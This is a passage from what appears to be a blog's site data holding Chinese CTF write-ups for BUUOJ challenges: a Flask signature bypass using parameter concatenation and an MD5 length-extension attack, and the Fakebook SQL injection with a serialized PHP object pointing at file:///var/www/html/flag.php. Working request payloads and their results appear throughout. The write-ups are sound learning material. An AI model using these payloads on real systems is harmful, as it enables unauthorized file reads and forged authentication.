class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   #写上原有数据</span><br><span class=\"line\">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class=\"line\">Input Data to Add: read   #拓展的数据</span><br><span class=\"line\">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>"},{"title":"buuoj刷题记录5","date":"2019-12-30T08:19:44.000Z","_content":"\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","source":"_posts/buuoj刷题记录5.md","raw":"---\ntitle: buuoj刷题记录5\ndate: 2019-12-30 16:19:44\ntags:\n - 网鼎杯2018\n - buuctf\n - web\n---\n\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","slug":"buuoj刷题记录5","published":1,"updated":"2020-01-02T06:26:03.823Z","_id":"ck4wcegh50000yo7e74w97qcq","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class UserInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name &#x3D; &quot;&quot;;</span><br><span class=\"line\">    public $age &#x3D; 0;</span><br><span class=\"line\">    public $blog &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($name, $age, $blog)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;name &#x3D; $name;</span><br><span class=\"line\">        $this-&gt;age &#x3D; (int)$age;</span><br><span class=\"line\">        $this-&gt;blog &#x3D; $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get($url)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class=\"line\">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class=\"line\">            return 404;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        return $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getBlogContents ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isValidBlog ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $blog &#x3D; $this-&gt;blog;</span><br><span class=\"line\">        return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 